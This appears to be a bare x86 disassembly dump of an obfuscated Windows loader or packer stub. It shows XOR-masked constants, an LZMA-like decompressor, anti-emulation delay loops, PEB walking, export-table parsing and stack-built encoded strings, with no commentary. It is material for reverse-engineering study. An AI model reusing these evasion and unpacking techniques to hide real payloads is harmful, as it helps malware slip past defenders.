  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
